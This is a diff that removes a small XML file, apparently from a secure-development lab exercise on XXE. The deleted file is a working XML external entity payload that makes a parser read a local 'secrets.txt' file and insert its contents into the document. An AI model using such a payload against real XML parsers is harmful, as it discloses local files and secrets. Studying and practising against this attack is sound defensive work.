@@ -1,5 +1,0 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [
-    <!ENTITY xxe SYSTEM "file:///home/debian/dev/sandbox/secdev/6_xxe/secrets.txt" >
-]>
-<bookstore>&xxe;</bookstore> 
